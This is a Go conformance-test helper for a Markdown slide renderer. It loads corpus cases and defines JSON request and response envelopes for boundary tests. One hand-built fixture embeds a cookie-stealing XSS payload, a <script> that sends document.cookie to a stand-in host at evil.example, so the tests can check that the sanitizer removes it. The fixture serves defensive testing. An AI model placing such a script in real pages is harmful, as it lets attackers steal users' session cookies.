// Copyright (c) 2026 AO Cyber Systems
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// SPDX-License-Identifier: MIT

package conformance

import (
	"encoding/json"
	"fmt"
	"path/filepath"

	"github.com/AO-Cyber-Systems/eden-press/bind/capi/core"
	"github.com/AO-Cyber-Systems/eden-press/conformance/corpus"
	"github.com/AO-Cyber-Systems/eden-press/press"
)

// corpusRoot mirrors the EXACT path-resolution pattern conformance/runner's
// own corpus_test.go / chase_corpus_test.go use (filepath.Join("..", "corpus",
// "cases")), extended by one more ".." because bind/conformance sits one
// directory level deeper than conformance/runner: conformance/runner and
// conformance/corpus are siblings under conformance/, while bind/conformance
// and conformance/corpus are siblings only once you climb out of bind/ too.
var corpusRoot = filepath.Join("..", "..", "conformance", "corpus", "cases")

// subsetIDs names the ON-DISK corpus cases (conformance/corpus/cases/<id>/)
// whose union already exercises strikethrough, emoji, code-fence highlight,
// math, autofit, and plain CommonMark -- confirmed by direct inspection of
// each case's input.md. Every one of these cases' options.json carries only
// {"requires_engine":"marp-core"} (a corpus-loader-only marker consumed by
// conformance/runner's PENDING logic -- it is NOT a press.Render option and
// is deliberately absent from the wire options subset below), so each
// resolves to zero-value press.Options / wire options -- which, per
// press.Options' own doc comment and press/capstone_test.go, is a valid,
// Marp-Core-matching configuration that exercises every battery by default.
var subsetIDs = []string{
	"marp-basic",          // plain CommonMark: heading + bold/italic paragraph
	"marp-strikethrough",  // strikethrough battery: ~~gone~~
	"marp-emoji",          // emoji battery: :smile: shortcode + literal unicode
	"marp-code-highlight", // highlight battery: fenced ```go code block
	"marp-math",           // math battery: inline $..$ + display $$..$$
	"marp-fit-heading",    // autofit battery: # <!--fit--> heading
}

// sanitizeCaseID names the hand-built case below: no on-disk corpus case
// exercises the sanitize battery (there is no XSS/disallowed-tag fixture
// under conformance/corpus/cases/), so it is defined inline here instead,
// hand-built (NOT LLM-generated, per 07-04 anti_patterns) and modeled
// directly on press/sanitize/adversarial_test.go's
// TestAdversarialScriptInjection vector.
const sanitizeCaseID = "boundary-sanitize-xss"

// sanitizeCaseMD is fed through goldmark with raw-HTML passthrough enabled
// (chase/markdown's seam sets ghtml.WithUnsafe() -- confirmed by inspection
// of chase/markdown/seam.go), so the literal <script> line survives parsing
// as a raw HTML block and reaches press/sanitize.Sanitize for real, exactly
// mirroring TestAdversarialScriptInjection's payload. The leading speaker
// note comment (no "key: value" syntax) also gives the whole-shape assertion
// (Test-list case 3, Comments) a genuine non-vacuous case: chase/model/build.go's
// isNote() treats any comment with zero parsed directive key/value pairs as a
// plain presenter note, so this exact comment is aggregated into
// press.Output.Comments.
const sanitizeCaseMD = `# Sanitize battery

<!-- boundary speaker note -->

<script>document.location='https://evil.example/steal?c='+document.cookie</script>

Safe paragraph that must survive sanitization.
`

// sanitizeCase builds the hand-crafted sanitize-battery corpus.Case. It has
// no on-disk Dir (it is not loaded from disk) and no ExpectedHTML/ExpectedCSS
// of its own: neither boundary test ever compares against a golden HTML for
// any subset case (07-04 anti_patterns forbids the Marp golden as the
// primary signal) -- every case is instead compared against a FRESH
// in-process press.Render(...) call made at test time.
func sanitizeCase() corpus.Case {
	return corpus.Case{
		ID:      sanitizeCaseID,
		InputMD: sanitizeCaseMD,
		Options: map[string]any{},
	}
}

// BatteryOf maps each subset case ID to the press battery it exercises, so
// Test-list case 1 (subset coverage) can assert the union spans every
// battery without hardcoding the ID list a second time.
var BatteryOf = map[string]string{
	"marp-basic":          "commonmark",
	"marp-strikethrough":  "strikethrough",
	"marp-emoji":          "emoji",
	"marp-code-highlight": "highlight",
	"marp-math":           "math",
	"marp-fit-heading":    "autofit",
	sanitizeCaseID:        "sanitize",
}

// RequiredBatteries is every battery Test-list case 1 requires the subset to
// cover -- press.Render's own composed battery set, plus plain CommonMark
// (07-04 objective: the boundary must be stressed across the whole Output
// shape, not a CommonMark-only slice).
var RequiredBatteries = []string{
	"commonmark",
	"strikethrough",
	"emoji",
	"highlight",
	"math",
	"autofit",
	"sanitize",
}

// Subset loads the shared Objective 0 corpus (at corpusRoot) and returns the
// curated, battery-spanning slice named by subsetIDs plus the hand-built
// sanitizeCase, in that fixed, deterministic order. It errors clearly if the
// corpus can't be loaded or a named ID isn't present on disk.
func Subset() ([]corpus.Case, error) {
	all, err := corpus.LoadCases(corpusRoot)
	if err != nil {
		return nil, fmt.Errorf("conformance: load shared corpus %q: %w", corpusRoot, err)
	}
	byID := make(map[string]corpus.Case, len(all))
	for _, c := range all {
		byID[c.ID] = c
	}

	subset := make([]corpus.Case, 0, len(subsetIDs)+1)
	for _, id := range subsetIDs {
		c, ok := byID[id]
		if !ok {
			return nil, fmt.Errorf("conformance: subset case %q not found under %q", id, corpusRoot)
		}
		subset = append(subset, c)
	}
	subset = append(subset, sanitizeCase())
	return subset, nil
}

// --- Shared JSON wire envelope (the bind/capi/core "eden-press.capi/v1"
// contract, re-declared here because core's own request/response/
// requestOptions types are unexported) -----------------------------------
//
// Both boundary lanes (wasm_boundary_test.go, capi_boundary_test.go) build a
// request with buildRequestJSON and parse the artifact's reply with
// parseResponse, so the envelope shape is defined exactly ONCE here rather
// than twice.

// requestOptionsWire is the wire-serializable option subset, field-for-field
// identical to bind/capi/core's unexported requestOptions.
type requestOptionsWire struct {
	Theme          string `json:"theme"`
	Profile        string `json:"profile"`
	InlineSVG      bool   `json:"inlineSvg"`
	MathMode       string `json:"mathMode"`
	NoHighlight    bool   `json:"noHighlight"`
	HighlightStyle string `json:"highlightStyle"`
}

// requestEnvelope is the outbound request, matching bind/capi/core's
// unexported request type.
type requestEnvelope struct {
	EnvelopeVersion string             `json:"envelopeVersion"`
	Markdown        string             `json:"markdown"`
	Options         requestOptionsWire `json:"options"`
}

// responseEnvelope is the inbound response. It embeds *press.Output DIRECTLY
// (rather than a hand-duplicated field-by-field wire struct): press.Output's
// own fields (HTML, CSS, Model, Meta, Comments) carry no json tags, so they
// already marshal/unmarshal under Go's default (capitalized) key names --
// exactly the wire shape bind/capi/core.RenderJSON produces -- and Model
// (*model.Document) is independently json-tagged for its own fields
// (schemaVersion, etc.), so reusing press.Output here gets the WHOLE nested
// shape for free instead of re-declaring it.
type responseEnvelope struct {
	EnvelopeVersion string        `json:"envelopeVersion"`
	Output          *press.Output `json:"output,omitempty"`
	Error           string        `json:"error,omitempty"`
}

// stringOpt / boolOpt read a recognized key out of a corpus.Case's decoded
// Options map, defensively defaulting to the zero value on a missing key or
// type mismatch (mirroring bind/capi/core's own lenient decoding).
func stringOpt(opts map[string]any, key string) string {
	if v, ok := opts[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func boolOpt(opts map[string]any, key string) bool {
	if v, ok := opts[key]; ok {
		if b, ok := v.(bool); ok {
			return b
		}
	}
	return false
}

// wireOptionsFromMap and pressOptionsFromMap below deliberately read the SAME
// six recognized keys (theme/profile/inlineSvg/mathMode/noHighlight/
// highlightStyle) from the SAME corpus.Case.Options source via the SAME
// stringOpt/boolOpt helpers. This guarantees the request sent across the
// boundary and the options used for the in-process comparison render can
// never drift apart by construction. Every on-disk subset case's
// options.json carries only "requires_engine" (not a recognized key here),
// so all of them resolve to the zero-value press.Options{} / requestOptionsWire{}.

// wireOptionsFromMap builds the JSON request's options object from a
// corpus.Case's decoded Options map.
func wireOptionsFromMap(opts map[string]any) requestOptionsWire {
	return requestOptionsWire{
		Theme:          stringOpt(opts, "theme"),
		Profile:        stringOpt(opts, "profile"),
		InlineSVG:      boolOpt(opts, "inlineSvg"),
		MathMode:       stringOpt(opts, "mathMode"),
		NoHighlight:    boolOpt(opts, "noHighlight"),
		HighlightStyle: stringOpt(opts, "highlightStyle"),
	}
}

// pressOptionsFromMap builds the press.Options used for the in-process
// comparison render from the SAME corpus.Case.Options map. Sanitize is left
// nil, selecting the built-in always-on policy -- matching
// bind/capi/core.renderOnce's identical choice, so the in-process comparison
// render and the boundary's own internal call to press.Render never diverge
// on sanitization policy.
func pressOptionsFromMap(opts map[string]any) press.Options {
	return press.Options{
		Theme:          stringOpt(opts, "theme"),
		Profile:        stringOpt(opts, "profile"),
		InlineSVG:      boolOpt(opts, "inlineSvg"),
		MathMode:       stringOpt(opts, "mathMode"),
		NoHighlight:    boolOpt(opts, "noHighlight"),
		HighlightStyle: stringOpt(opts, "highlightStyle"),
	}
}

// buildRequestJSON builds the exact "eden-press.capi/v1" request envelope
// JSON both boundary lanes send. A json.Marshal failure here would mean a Go
// encoding bug (every field is a plain string/bool), not a data problem, so
// it panics rather than returning an error a caller could not meaningfully
// act on.
func buildRequestJSON(markdown string, opts map[string]any) []byte {
	req := requestEnvelope{
		EnvelopeVersion: core.EnvelopeVersion,
		Markdown:        markdown,
		Options:         wireOptionsFromMap(opts),
	}
	b, err := json.Marshal(req)
	if err != nil {
		panic(fmt.Sprintf("conformance: marshal request envelope: %v", err))
	}
	return b
}

// parseResponse decodes a raw JSON response envelope returned by either
// boundary lane.
func parseResponse(raw []byte) (responseEnvelope, error) {
	var resp responseEnvelope
	if err := json.Unmarshal(raw, &resp); err != nil {
		return responseEnvelope{}, fmt.Errorf("conformance: parse response envelope: %w (raw: %s)", err, truncate(raw, 200))
	}
	return resp, nil
}

// truncate bounds an error message's embedded raw payload so a malformed,
// huge response doesn't flood test output.
func truncate(b []byte, n int) string {
	s := string(b)
	if len(s) <= n {
		return s
	}
	return s[:n] + "...(truncated)"
}
